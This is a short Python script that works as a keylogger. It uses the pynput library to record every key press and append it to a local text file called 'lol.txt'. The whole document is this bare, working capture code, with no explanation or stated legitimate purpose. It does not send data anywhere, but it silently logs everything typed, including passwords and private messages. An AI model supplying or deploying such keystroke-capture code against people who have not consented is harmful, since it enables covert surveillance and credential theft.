from pynput.keyboard import Listener


def writetofile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")
    with open("lol.txt","a") as f:
        f.write(keydata+"\n")



with Listener(on_press=writetofile) as l:
    l.join()
   

   

